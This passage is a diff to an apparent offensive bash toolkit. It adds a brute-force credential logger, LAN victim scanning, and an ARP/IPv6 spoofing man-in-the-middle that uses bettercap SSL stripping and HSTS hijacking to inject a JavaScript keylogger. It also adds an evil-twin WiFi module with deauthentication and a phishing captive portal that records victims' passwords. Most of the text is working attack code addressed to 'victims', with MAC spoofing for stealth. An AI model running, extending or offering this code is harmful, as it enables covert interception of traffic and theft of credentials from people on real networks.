+                f.write(f"[BRUTE?] user={USERNAME!r}  pass={pwd!r}  src={TARGET} (verify)\n")
+        else:
+            print(f"[{attempts}] {pwd}: HTTP 200 → wrong")
+    else:
+        print(f"[{attempts}] {pwd}: {status}")
+
+    time.sleep(1.5)
+
+if not found:
+    print(f"\n[*] Done — {attempts} attempts, no success yet.")
+    print(f"[*] Successful credentials (if any) → {CREDS_OUT}")
+PYEOF
+
     step 5 "DONE"
-    info "Check /tmp/caught.txt for any successful credentials"
+    info "Successful credentials → ${W}$OP/logs/credentials.txt${N}  (C2 panel Credentials tab)"
     wait_key
 }
 
@@ -1767,16 +2284,122 @@ physical_scan() {
     banner
     step 4 "SCAN — Find Victims on LAN"
     echo ""
-    SUBNET=$(ip route | grep -v default | grep "$MY_IP" | awk '{print $1}' | head -1)
-    [ -z "$SUBNET" ] && SUBNET="192.168.2.0/24"
-    info "Scanning $SUBNET ..."
+
+    # Detect subnet from active interface
+    local _iface _subnet _gw _myip
+    _iface=$(ip route | awk '/default/{print $5; exit}')
+    _gw=$(ip route | awk '/default/{print $3; exit}')
+    _subnet=$(ip route | grep -v default | grep "$_iface" | awk '{print $1}' | head -1)
+    _myip=$(ip -4 addr show "$_iface" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
+    [ -z "$_subnet" ] && _subnet="${MY_IP%.*}.0/24"
+
+    info "Interface : $_iface   Gateway: $_gw"
+    info "Scanning  : $_subnet"
     echo ""
-    nmap -sn "$SUBNET" 2>/dev/null | grep -E "Nmap scan|Host is up|report for" | \
-        grep -v "$(hostname)" | head -30
+
+    # ── Method 1: arp-scan (layer-2, fastest, ~1s, catches hosts that block ICMP) ──
+    local _hosts=""
+    if command -v arp-scan &>/dev/null; then
+        info "[arp-scan] Layer-2 ARP sweep (fastest)..."
+        _hosts=$(sudo arp-scan --interface="$_iface" --localnet 2>/dev/null \
+            | awk '/^[0-9]/{printf "  %-17s  %-20s  %s\n", $1, $2, $3}' \
+            | grep -v "$_myip")
+
+    # ── Method 2: fping + arp (layer-3 ICMP, ~2s, then read ARP cache) ──
+    elif command -v fping &>/dev/null; then
+        info "[fping] ICMP broadcast sweep..."
+        fping -a -g "$_subnet" 2>/dev/null | grep -v "$_myip" > /tmp/_fping_hosts.txt
+        # enrich with MAC from ARP cache
+        arp -n 2>/dev/null > /tmp/_arp_cache.txt
+        _hosts=$(while IFS= read -r ip; do
+            _mac=$(awk -v h="$ip" '$1==h{print $3}' /tmp/_arp_cache.txt)
+            _host=$(getent hosts "$ip" 2>/dev/null | awk '{print $2}')
+            printf "  %-17s  %-20s  %s\n" "$ip" "${_mac:--}" "${_host:-}"
+        done < /tmp/_fping_hosts.txt)
+
+    # ── Method 3: masscan (SYN scan, sub-second for /24) ──
+    elif command -v masscan &>/dev/null; then
+        info "[masscan] TCP SYN sweep on ports 22,80,443,8080..."
+        _hosts=$(sudo masscan "$_subnet" -p22,80,443,445,8080 --rate=5000 2>/dev/null \
+            | awk '/open/{print $6}' | sort -u \
+            | grep -v "$_myip" \
+            | while read -r ip; do
+                _mac=$(arp -n "$ip" 2>/dev/null | awk '/ether/{print $3}')
+                printf "  %-17s  %s\n" "$ip" "${_mac:--}"
+              done)
+
+    # ── Method 4: nmap (fallback, optimised) ──
+    else
+        info "[nmap] Ping sweep (fallback)..."
+        _hosts=$(nmap -sn --min-rate 5000 -T5 --max-retries 1 "$_subnet" 2>/dev/null \
+            | awk '/report for/{ip=$NF} /MAC Address/{printf "  %-17s  %-20s  %s\n", ip, $3, substr($0, index($0,$4))}' \
+            | grep -v "$_myip")
+    fi
+
+    # ── Python enrichment pass: hostname + open ports (parallel, 3s timeout) ──
+    local _tmpraw="/tmp/_lan_raw_$$.txt"
+    echo "$_hosts" > "$_tmpraw"
+
+    python3 - "$_tmpraw" "$_myip" <<'PYEOF'
+import sys, socket, concurrent.futures, re, os
+
+raw_file = sys.argv[1]
+my_ip    = sys.argv[2]
+lines    = open(raw_file).read().strip().splitlines()
+
+IP_RE = re.compile(r'\b(\d{1,3}(?:\.\d{1,3}){3})\b')
+
+def enrich(line):
+    m = IP_RE.search(line)
+    if not m: return line
+    ip = m.group(1)
+    if ip == my_ip: return None
+    try:
+        hostname = socket.gethostbyaddr(ip)[0]
+    except Exception:
+        hostname = ''
+    # Quick port probe: 22 23 80 443 445 3389 8080 8443
+    open_ports = []
+    for port in (22, 23, 80, 443, 445, 3389, 8080):
+        try:
+            s = socket.socket()
+            s.settimeout(0.3)
+            if s.connect_ex((ip, port)) == 0:
+                open_ports.append(str(port))
+            s.close()
+        except Exception:
+            pass
+    extra = ''
+    if hostname: extra += f'  ({hostname})'
+    if open_ports: extra += f'  ports:{",".join(open_ports)}'
+    return line.rstrip() + extra
+
+C  = '\033[96m'
+N  = '\033[0m'
+W  = '\033[93m'
+
+print(f"  {'IP':<17}  {'MAC':<20}  {'Vendor':<22}  Info")
+print("  " + "─"*80)
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
+    futs = {ex.submit(enrich, l): l for l in lines if l.strip()}
+    for f in concurrent.futures.as_completed(futs):
+        result = f.result()
+        if result:
+            print(f"{C}  {result.strip()}{N}")
+PYEOF
+
+    rm -f "$_tmpraw"
     echo ""
-    ask "Enter victim IP address:"
-    VICTIM_IP="$REPLY"
-    ok "Target: $VICTIM_IP"
+
+    if [ -n "$VICTIM_IP" ] && valid_ip "$VICTIM_IP"; then
+        ok "Victim IP already set: $VICTIM_IP (entered at Step 3)"
+    else
+        [ -n "$VICTIM_IP" ] && err "Stored IP '$VICTIM_IP' is invalid — please re-enter."
+        VICTIM_IP=""
+        ask_victim_ip "Enter victim IP address:"
+        ok "Target: $VICTIM_IP"
+    fi
     log "Victim IP: $VICTIM_IP"
     wait_key
 }
@@ -1785,6 +2408,20 @@ physical_arp_keylogger() {
     banner
     step 5 "LAUNCH — ARP Spoof + Keylogger"
     echo ""
+
+    # Guard: victim IP must be a LAN address (same /24 as our interface)
+    local _my_prefix _vic_prefix _lan_ip
+    _lan_ip=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
+    [ -z "$_lan_ip" ] && _lan_ip=$(ip -4 addr show | awk '/inet /{print $2}' | grep -v '^127' | head -1 | cut -d/ -f1)
+    _my_prefix=$(echo "$_lan_ip" | cut -d. -f1-3)
+    _vic_prefix=$(echo "$VICTIM_IP" | cut -d. -f1-3)
+    if [ -n "$_my_prefix" ] && [ "$_my_prefix" != "$_vic_prefix" ]; then
+        err "Victim IP '$VICTIM_IP' is NOT on your local network ($_my_prefix.x)."
+        err "ARP spoofing only works on LAN devices. Pick a host from the scan list."
+        echo ""
+        ask_victim_ip "Enter a LAN victim IP (e.g. $_my_prefix.x):"
+    fi
+
     info "Poisoning ARP table: $VICTIM_IP ↔ gateway"
     info "All their traffic will flow through this machine"
     info "Keylogger JS will be injected into every page"
@@ -1794,10 +2431,11 @@ physical_arp_keylogger() {
     if [ "$EUID" -ne 0 ]; then
         warn "ARP spoof requires root privileges."
         echo ""
-        ask "Re-launch with sudo now? [Y/n]:"
-        read -r _SUDO_CHOICE
+        echo -e "  ${W}Re-launch with sudo now? [Y/n]:${N}"
+        echo -n "  > "
+        read -r _SUDO_CHOICE </dev/tty
         if [[ "${_SUDO_CHOICE,,}" != "n" ]]; then
-            exec sudo bash "$_SELF" physical "$VICTIM_IP" "$TARGET_DOMAIN"
+            exec sudo -k bash "$_SELF" physical "$VICTIM_IP" "$TARGET_DOMAIN"
         else
             err "Cannot continue without root. Exiting."
             exit 1
@@ -1807,44 +2445,134 @@ physical_arp_keylogger() {
     GATEWAY=$(ip route | awk '/default/{print $3; exit}')
     IFACE=$(ip route | awk '/default/{print $5; exit}')
 
-    step "5a" "Enabling IP forwarding..."
-    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null || \
+    step "5a" "Enabling IP forwarding + iptables..."
+    echo 1 | tee /proc/sys/net/ipv4/ip_forward > /dev/null || \
         { err "Failed to enable IP forwarding"; exit 1; }
-    sudo iptables -t nat -F PREROUTING 2>/dev/null
-    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80  -j REDIRECT --to-port 8080 || \
-        { err "iptables rule failed — check iptables is installed"; exit 1; }
-    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
-    ok "IP forwarding + iptables ready"
+    # Flush and set rules: HTTP→8080 (mitmproxy), HTTPS→8443 (bettercap ssl.proxy)
+    iptables -t nat -F PREROUTING 2>/dev/null
+    iptables -t nat -A PREROUTING -i "$IFACE" -s "$VICTIM_IP" -p tcp --dport 80  -j REDIRECT --to-port 8080 || \
+        { err "iptables rule failed"; exit 1; }
+    iptables -t nat -A PREROUTING -i "$IFACE" -s "$VICTIM_IP" -p tcp --dport 443 -j REDIRECT --to-port 8443
+    ok "IP forwarding + iptables ready (HTTP→8080, HTTPS→8443)"
 
-    step "5b" "Starting ARP spoof..."
-    arpspoof -i $IFACE -t $VICTIM_IP $GATEWAY > /dev/null 2>&1 & ARP1=$!
-    arpspoof -i $IFACE -t $GATEWAY $VICTIM_IP > /dev/null 2>&1 & ARP2=$!
-    ok "ARP poisoning PIDs: $ARP1 $ARP2"
+    step "5b" "Starting ARP spoof + MAC spoof (stealth)..."
 
-    step "5c" "Starting DNS spoof ($TARGET_DOMAIN → $MY_IP)..."
-    cat > /tmp/bettercap_spoof.cap << EOF
+    # ── MAC randomization — attacker appears as random device ──
+    local _orig_mac _fake_mac
+    _orig_mac=$(ip link show "$IFACE" | awk '/ether/{print $2}')
+    _fake_mac=$(python3 -c "
+import random
+m=[0x00,random.randint(0x01,0xfe)]+[random.randint(0x00,0xff) for _ in range(4)]
+print(':'.join('%02x'%x for x in m))")
+    ip link set "$IFACE" down 2>/dev/null
+    ip link set "$IFACE" address "$_fake_mac" 2>/dev/null
+    ip link set "$IFACE" up 2>/dev/null
+    ok "MAC spoofed: $orig_mac → $_fake_mac"
+
+    # ── IPv4 ARP poison ──
+    arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY" > /dev/null 2>&1 & ARP1=$!
+    sleep 2
+    arpspoof -i "$IFACE" -t "$GATEWAY" "$VICTIM_IP" > /dev/null 2>&1 & ARP2=$!
+    ok "IPv4 ARP poisoning PIDs: $ARP1 $ARP2"
+
+    # ── IPv6 Neighbor Spoofing (dual-stack intercept) ──
+    if command -v parasite6 &>/dev/null; then
+        parasite6 "$IFACE" > /dev/null 2>&1 & ARP6=$!
+        ok "IPv6 ND spoofing PID: $ARP6"
+    elif command -v fake_router6 &>/dev/null; then
+        # Send rogue Router Advertisement — claim we are the default IPv6 router
+        fake_router6 "$IFACE" > /dev/null 2>&1 &
+        ARP6=$!
+        ok "IPv6 RA injection PID: $ARP6 (rogue router advertisement)"
+    else
+        warn "IPv6 tools (parasite6/fake_router6) not found — IPv4 only"
+        warn "Install: apt install thc-ipv6"
+        ARP6=""
+    fi
+
+    step "5c" "Starting HTTPS interception + HSTS bypass (bettercap)..."
+    rm -f /tmp/bc_kl.cap /tmp/bc_kl.log
+    # Build bettercap caplet: ARP spoof + DNS spoof + SSL proxy + HSTS hijack
+    cat > /tmp/bc_kl.cap << BCEOF
 set arp.spoof.targets $VICTIM_IP
-set dns.spoof.domains $TARGET_DOMAIN
+set arp.spoof.internal true
+set dns.spoof.domains *
 set dns.spoof.address $MY_IP
 set dns.spoof.all true
+set https.proxy.port 8443
+set https.proxy.sslstrip true
+set http.proxy.port 8080
+set hstshijack.targets $TARGET_DOMAIN
+set hstshijack.replacements $(echo "$TARGET_DOMAIN" | sed 's/\./\&#x2024;/g')
 arp.spoof on
 dns.spoof on
-EOF
-    bettercap -iface $IFACE -caplet /tmp/bettercap_spoof.cap > /tmp/bettercap.log 2>&1 &
-    ok "DNS spoof running"
+https.proxy on
+hstshijack on
+BCEOF
+    bettercap -iface "$IFACE" -caplet /tmp/bc_kl.cap > /tmp/bc_kl.log 2>&1 &
+    BC_PID=$!
+    sleep 2
+    ok "HTTPS proxy on :8443 + HSTS hijack active"
 
-    step "5d" "Starting keylogger injector..."
+    step "5d" "Starting JS keylogger injector (mitmproxy transparent on :8080)..."
     KL_DIR="/tmp/kl_run"; mkdir -p "$KL_DIR/logs"
     cp "$MITM_DIR/intercept.py" "$KL_DIR/inject.py"
     cp "$MITM_DIR/catcher.py"   "$KL_DIR/catcher.py"
     CATCHER_PORT=9999 LOG_DIR="$KL_DIR/logs" \
         nohup python3 "$KL_DIR/catcher.py" > "$KL_DIR/catcher.log" 2>&1 &
     TARGET_DOMAIN=$TARGET_DOMAIN MY_IP=$MY_IP CATCHER_PORT=9999 \
-        nohup mitmdump -s "$KL_DIR/inject.py" -p 8080 --ssl-insecure --quiet \
+        nohup mitmdump -s "$KL_DIR/inject.py" \
+        --mode transparent \
+        --ssl-insecure \
+        --set termlog_verbosity=warn \
+        -p 8080 --quiet \
         > "$KL_DIR/proxy.log" 2>&1 &
     KL_PID=$!
-    sleep 3
+    sleep 2
     ok "Keylogger injecting on :8080"
+
+    # ── CA cert install — phone installs this → zero SSL warnings ──
+    _CA_SRC="$HOME/.mitmproxy/mitmproxy-ca-cert.pem"
+    _CA_SERVE="/tmp/kl_run/cert.pem"
+    if [ -f "$_CA_SRC" ]; then
+        cp "$_CA_SRC" "$_CA_SERVE"
+        # Serve cert on port 8888 so phone can install it
+        python3 -c "
+import http.server, os, threading
+os.chdir('/tmp/kl_run')
+class H(http.server.SimpleHTTPRequestHandler):
+    def log_message(self,*a): pass
+    def do_GET(self):
+        if self.path in ('/','/cert','/cert.pem'):
+            self.send_response(200)
+            self.send_header('Content-Type','application/x-x509-ca-cert')
+            self.send_header('Content-Disposition','attachment; filename=mitmproxy-ca-cert.pem')
+            self.end_headers()
+            self.wfile.write(open('cert.pem','rb').read())
+        else: super().do_GET()
+http.server.HTTPServer(('0.0.0.0',7788),H).serve_forever()
+" &>/dev/null &
+        # Get the actual LAN IP for this interface (not VPN/tunnel)
+        local _cert_ip
+        _cert_ip=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
+        [ -z "$_cert_ip" ] && _cert_ip="$MY_IP"
+        echo ""
+        ok "CA cert server on :7788"
+        echo ""
+        echo -e "  ${Y}┌─ OPTIONAL (physical access only): Install CA cert for silent HTTPS ─┐${N}"
+        echo -e "  ${Y}│${N}  This requires brief access to the victim device"
+        echo -e "  ${Y}│${N}  1. On victim phone, open:  ${C}http://$_cert_ip:7788/cert${N}"
+        echo -e "  ${Y}│${N}  2. Install the cert (Settings → Security → CA certificate)"
+        echo -e "  ${Y}│${N}  3. All HTTPS traffic intercepted with zero browser warnings"
+        echo -e "  ${Y}│${N}  Without cert: bettercap strips HTTPS where HSTS allows it"
+        echo -e "  ${Y}└────────────────────────────────────────────────────────────────────┘${N}"
+        if command -v qrencode &>/dev/null; then
+            echo ""
+            info "QR for cert URL:"
+            qrencode -t ANSIUTF8 -s 1 "http://$_cert_ip:7788/cert" 2>/dev/null
+        fi
+        echo ""
+    fi
 
     step 6 "MONITOR — victim browses $TARGET_DOMAIN normally"
     echo ""
@@ -1853,10 +2581,17 @@ EOF
 
     trap "
         echo ''; echo '[*] Cleaning up...'
-        kill \$ARP1 \$ARP2 \$KL_PID 2>/dev/null
-        sudo iptables -t nat -F PREROUTING 2>/dev/null
-        echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
-        echo '[*] Done'
+        kill \$ARP1 \$ARP2 \$ARP6 \$KL_PID \$BC_PID 2>/dev/null
+        pkill -f 'arpspoof' 2>/dev/null
+        pkill -f 'bettercap' 2>/dev/null
+        pkill -f 'parasite6\|fake_router6' 2>/dev/null
+        iptables -t nat -F PREROUTING 2>/dev/null
+        echo 0 > /proc/sys/net/ipv4/ip_forward
+        # Restore original MAC
+        ip link set $IFACE down 2>/dev/null
+        ip link set $IFACE address $_orig_mac 2>/dev/null
+        ip link set $IFACE up 2>/dev/null
+        echo '[*] MAC restored, done'
         exit 0
     " INT TERM
 
@@ -1868,63 +2603,289 @@ physical_evil_twin() {
     banner
     step 5 "EVIL TWIN — Rogue WiFi Hotspot"
     echo ""
-    warn "Requires a second WiFi adapter (AP mode capable)"
-    echo ""
-    info "Available interfaces:"
-    ip link show | grep -E "^[0-9]" | awk '{print "  "$2}' | tr -d ':'
-    echo ""
-    ask "Enter interface for hotspot (e.g. wlan1):"
-    AP_IFACE="$REPLY"
 
-    ask "SSID to clone (name of victim's WiFi):"
+    # ── Interface selection + single-adapter virtual interface ──
+    info "Available wireless interfaces:"
+    local _wifs
+    _wifs=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
+    [ -z "$_wifs" ] && _wifs=$(ip link show | awk -F': ' '/wlan|wlp/{print $2}')
+
+    local _wif_count; _wif_count=$(echo "$_wifs" | grep -c .)
+    if [ "$_wif_count" -lt 2 ]; then
+        local _base_iface; _base_iface=$(echo "$_wifs" | head -1)
+        echo ""
+        warn "Only one WiFi adapter detected ($_base_iface)."
+        info "Attempting to create virtual AP interface (works on most Kali chipsets)..."
+        # Remove old virtual iface if exists
+        iw dev "${_base_iface}ap" del 2>/dev/null
+        iw dev "$_base_iface" interface add "${_base_iface}ap" type __ap 2>/dev/null
+        if iw dev 2>/dev/null | grep -q "${_base_iface}ap"; then
+            ok "Virtual AP interface created: ${_base_iface}ap"
+            info "Note: both interfaces share the same channel — internet may be limited"
+            _wifs="$_wifs"$'\n'"${_base_iface}ap"
+        else
+            warn "Virtual interface failed — your chipset may not support concurrent AP+STA."
+            warn "Options: (1) get a USB WiFi dongle  (2) use AP-only mode (no internet for victim)"
+            ask "Continue with AP-only mode (no internet uplink)? [y/N]:"
+            [[ "${REPLY,,}" != "y" ]] && return
+            AP_IFACE="$_base_iface"
+            INET_IFACE=""
+        fi
+    fi
+    local _n=0
+    while IFS= read -r _w; do
+        _n=$((_n+1))
+        local _mode; _mode=$(iw dev "$_w" info 2>/dev/null | awk '/type/{print $2}')
+        echo -e "  ${C}[$_n]${N} $_w  ($_mode)"
+    done <<< "$_wifs"
+    echo ""
+    info "You need 2 interfaces: one stays connected (internet), one becomes the AP"
+    ask "AP interface (the one that will broadcast the fake WiFi, e.g. wlan1):"
+    AP_IFACE="$REPLY"
+    INET_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^$AP_IFACE$" | head -1)
+    [ -z "$INET_IFACE" ] && INET_IFACE="wlan0"
+    ok "AP interface: $AP_IFACE   Internet: $INET_IFACE"
+
+    # ── Scan nearby APs to pick one to clone ────────────────────
+    step "5a" "Scanning nearby WiFi networks..."
+    echo ""
+    ip link set "$AP_IFACE" up 2>/dev/null
+    # put in monitor mode briefly to scan
+    iw dev "$AP_IFACE" set type monitor 2>/dev/null
+    local _scan_out
+    _scan_out=$(timeout 8 airodump-ng "$AP_IFACE" --output-format csv \
+        -w /tmp/et_scan --write-interval 5 2>/dev/null; \
+        cat /tmp/et_scan-01.csv 2>/dev/null)
+    iw dev "$AP_IFACE" set type managed 2>/dev/null
+
+    # Fallback: use iwlist scan from inet iface
+    if [ -z "$_scan_out" ]; then
+        iwlist "$INET_IFACE" scan 2>/dev/null | \
+            awk '/ESSID|Channel|Quality/{print}' | \
+            paste - - - | \
+            sed 's/.*ESSID:"//;s/".*Channel://;s/ .*Quality=/  Q:/;s/\/.*//;s/^/  /' | head -20
+    else
+        echo "$_scan_out" | awk -F',' 'NR>2 && NF>8 && $1!~/Station/{
+            gsub(/ /,"",$1); gsub(/ /,"",$4); gsub(/ /,"",$14);
+            if($14!="") printf "  BSSID:%-20s  CH:%-3s  SSID:%s\n",$1,$4,$14
+        }' | head -20
+    fi
+    echo ""
+
+    ask "SSID to clone (exact name of the target WiFi):"
     SSID="$REPLY"
 
-    step "5a" "Setting up hostapd..."
-    cat > /tmp/hostapd.conf << EOF
+    # Get channel of target SSID
+    local _CH
+    _CH=$(iwlist "$INET_IFACE" scan 2>/dev/null | \
+        awk "/ESSID:\"$SSID\"/{found=1} found && /Channel:/{print \$1; exit}" | \
+        grep -o '[0-9]*' | head -1)
+    [ -z "$_CH" ] && _CH=6
+    ok "Cloning '$SSID' on channel $_CH"
+
+    # ── Optional deauth ──────────────────────────────────────────
+    echo ""
+    ask "Deauth victims from real AP to force them onto yours? [Y/n]:"
+    local _DEAUTH="$REPLY"
+
+    # ── Build captive portal ─────────────────────────────────────
+    step "5b" "Building captive portal..."
+    mkdir -p /tmp/et_portal
+    cat > /tmp/et_portal/portal.py << 'PYEOF'
+#!/usr/bin/env python3
+import os, json, threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
+from urllib.parse import parse_qs, urlparse, unquote
+
+LOG = os.environ.get("LOG_DIR", "/tmp/kl_run/logs")
+os.makedirs(LOG, exist_ok=True)
+SSID = os.environ.get("SSID", "WiFi")
+
+HTML = """<!DOCTYPE html><html><head><meta charset=UTF-8>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Login</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;
+     align-items:center;justify-content:center;min-height:100vh}
+.card{background:white;border-radius:12px;padding:32px 28px;width:340px;
+      box-shadow:0 4px 20px rgba(0,0,0,.12)}
+.icon{text-align:center;font-size:48px;margin-bottom:12px}
+h2{text-align:center;color:#333;margin-bottom:6px;font-size:20px}
+p{text-align:center;color:#666;font-size:13px;margin-bottom:24px}
+label{display:block;font-size:13px;color:#444;margin-bottom:4px;font-weight:600}
+input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;
+      font-size:14px;margin-bottom:16px;outline:none}
+input:focus{border-color:#0077ff}
+button{width:100%;padding:11px;background:#0077ff;color:white;border:none;
+       border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}
+button:hover{background:#005fcc}
+.err{color:#d00;font-size:13px;text-align:center;margin-top:12px;display:none}
+</style></head><body>
+<div class="card">
+  <div class="icon">&#x1F4F6;</div>
+  <h2>__SSID__</h2>
+  <p>Enter your WiFi password to continue</p>
+  <form method="POST" action="/connect">
+    <label>Network Password</label>
+    <input type="password" name="pass" placeholder="WiFi password" required autofocus>
+    <button type="submit">Connect</button>
+  </form>
+</div></body></html>""".replace("__SSID__", SSID)
+
+WAIT_HTML = """<!DOCTYPE html><html><head><meta charset=UTF-8>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="refresh" content="3;url=http://connectivitycheck.gstatic.com/generate_204">
+<title>Connecting...</title>
+<style>body{font-family:Arial,sans-serif;display:flex;align-items:center;
+justify-content:center;min-height:100vh;background:#f5f5f5}
+.card{background:white;border-radius:12px;padding:40px;text-align:center;
+box-shadow:0 4px 20px rgba(0,0,0,.12)}
+h2{color:#333;margin-bottom:8px}.spinner{margin:20px auto;width:40px;height:40px;
+border:4px solid #eee;border-top-color:#0077ff;border-radius:50%;
+animation:spin 0.8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}</style></head>
+<body><div class="card"><div class="spinner"></div>
+<h2>Connecting...</h2><p style="color:#666">Please wait</p></div></body></html>"""
+
+class Portal(BaseHTTPRequestHandler):
+    def log_message(self, *a): pass
+
+    def _redirect_portal(self):
+        self.send_response(302)
+        self.send_header("Location", "http://192.168.99.1/")
+        self.end_headers()
+
+    def do_GET(self):
+        path = urlparse(self.path).path
+        if path in ("/", "/hotspot-detect.html", "/generate_204",
+                    "/connecttest.txt", "/ncsi.txt", "/redirect"):
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html")
+            self.end_headers()
+            self.wfile.write(HTML.encode())
+        else:
+            self._redirect_portal()
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length).decode(errors="replace")
+        params = parse_qs(body)
+        passwd = params.get("pass", [""])[0]
+        ts = datetime.now().strftime("%H:%M:%S")
+        line = f"[{ts}] [captive-portal] SSID={SSID}  password={passwd}\n"
+        open(f"{LOG}/credentials.txt", "a").write(line)
+        print(f"[PORTAL] WiFi password captured: {passwd}", flush=True)
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.end_headers()
+        self.wfile.write(WAIT_HTML.encode())
+
+print(f"[*] Captive portal on :80  SSID={SSID}", flush=True)
+HTTPServer(("0.0.0.0", 80), Portal).serve_forever()
+PYEOF
+    ok "Captive portal ready (asks for WiFi password on connect)"
+
+    # ── hostapd ──────────────────────────────────────────────────
+    step "5c" "Starting rogue AP '$SSID' on channel $_CH..."
+    rm -f /tmp/et_hostapd.conf /tmp/et_hostapd.log
+    cat > /tmp/et_hostapd.conf << EOF
 interface=$AP_IFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
-channel=6
+channel=$_CH
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
+wmm_enabled=1
 EOF
+    ip link set "$AP_IFACE" up
+    hostapd /tmp/et_hostapd.conf > /tmp/et_hostapd.log 2>&1 &
+    HAP_PID=$!
+    sleep 2
+    if ! kill -0 $HAP_PID 2>/dev/null; then
+        err "hostapd failed — check /tmp/et_hostapd.log"
+        tail -5 /tmp/et_hostapd.log
+        exit 1
+    fi
+    ok "AP broadcasting: '$SSID'"
 
-    step "5b" "Setting up DHCP (dnsmasq)..."
-    cat > /tmp/dnsmasq_ap.conf << EOF
+    # ── DHCP + DNS (all domains → us) ───────────────────────────
+    step "5d" "Starting DHCP + DNS..."
+    rm -f /tmp/et_dnsmasq.conf /tmp/et_dnsmasq.log
+    ip addr flush dev "$AP_IFACE" 2>/dev/null
+    ip addr add 192.168.99.1/24 dev "$AP_IFACE"
+    cat > /tmp/et_dnsmasq.conf << EOF
 interface=$AP_IFACE
-dhcp-range=192.168.99.10,192.168.99.50,255.255.255.0,12h
+bind-interfaces
+dhcp-range=192.168.99.10,192.168.99.100,255.255.255.0,10m
 dhcp-option=3,192.168.99.1
 dhcp-option=6,192.168.99.1
-server=8.8.8.8
-address=/$TARGET_DOMAIN/192.168.99.1
-log-queries
+address=/#/192.168.99.1
+log-facility=/tmp/et_dnsmasq.log
 EOF
+    pkill dnsmasq 2>/dev/null; sleep 1
+    dnsmasq -C /tmp/et_dnsmasq.conf &
+    DNS_PID=$!
+    ok "DHCP + DNS running (all domains → captive portal)"
 
-    info "Starting hotspot..."
-    ip addr add 192.168.99.1/24 dev $AP_IFACE 2>/dev/null
-    ip link set $AP_IFACE up
-    hostapd /tmp/hostapd.conf > /tmp/hostapd.log 2>&1 &
-    dnsmasq -C /tmp/dnsmasq_ap.conf --no-daemon > /tmp/dnsmasq.log 2>&1 &
-    ok "Evil twin '$SSID' is broadcasting"
+    # ── IP forwarding (after victim enters password, give real internet) ─
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -F PREROUTING 2>/dev/null
+    iptables -t nat -A POSTROUTING -o "$INET_IFACE" -j MASQUERADE
+    # Redirect all HTTP to captive portal
+    iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80  -j DNAT --to 192.168.99.1:80
+    iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to 192.168.99.1:443
+    ok "IP forwarding + NAT ready"
 
-    info "Starting keylogger on port 8080..."
+    # ── Captive portal ───────────────────────────────────────────
+    step "5e" "Starting captive portal on :80..."
     KL_DIR="/tmp/kl_run"; mkdir -p "$KL_DIR/logs"
-    cp "$MITM_DIR/intercept.py" "$KL_DIR/inject.py"
-    cp "$MITM_DIR/catcher.py"   "$KL_DIR/catcher.py"
-    CATCHER_PORT=9999 LOG_DIR="$KL_DIR/logs" \
-        nohup python3 "$KL_DIR/catcher.py" > "$KL_DIR/catcher.log" 2>&1 &
-    TARGET_DOMAIN=$TARGET_DOMAIN MY_IP=192.168.99.1 CATCHER_PORT=9999 \
-        nohup mitmdump -s "$KL_DIR/inject.py" -p 8080 --ssl-insecure --quiet \
-        > "$KL_DIR/proxy.log" 2>&1 &
-    sleep 2
-    ok "Ready — when victim connects to '$SSID', all traffic is ours"
+    SSID="$SSID" LOG_DIR="$KL_DIR/logs" \
+        nohup python3 /tmp/et_portal/portal.py > /tmp/et_portal.log 2>&1 &
+    PORT_PID=$!
+    sleep 1
+    ok "Captive portal live — victims see WiFi password prompt on connect"
 
-    step 6 "MONITOR"
-    echo -e "  ${Y}Ctrl+C to stop${N}\n"
-    log "Evil twin running — SSID: $SSID iface: $AP_IFACE"
-    tail -f /tmp/kl_run/logs/*.txt /tmp/caught.txt 2>/dev/null
+    # ── Optional deauth ──────────────────────────────────────────
+    if [[ "${_DEAUTH,,}" != "n" ]]; then
+        step "5f" "Deauth — kicking victims off real AP..."
+        local _BSSID
+        _BSSID=$(iwlist "$INET_IFACE" scan 2>/dev/null | \
+            awk "found && /Address:/{print \$5; exit} /ESSID:\"$SSID\"/{found=1}")
+        if [ -n "$_BSSID" ]; then
+            info "Real AP BSSID: $_BSSID — sending deauth frames..."
+            aireplay-ng --deauth 0 -a "$_BSSID" "$AP_IFACE" > /dev/null 2>&1 &
+            DEAUTH_PID=$!
+            ok "Deauth running (continuous) — victims will reconnect to our AP"
+        else
+            warn "Could not find BSSID for '$SSID' — skipping deauth"
+            warn "Victim must manually disconnect from real AP or move out of range"
+        fi
+    fi
+
+    # ── Monitor ──────────────────────────────────────────────────
+    step 6 "MONITOR — waiting for victims to connect"
+    echo ""
+    info "Victims connect to '$SSID' → see password prompt → creds captured"
+    info "After password entry they get internet (looks legit)"
+    echo -e "  ${Y}Ctrl+C to stop and clean up${N}\n"
+
+    trap "
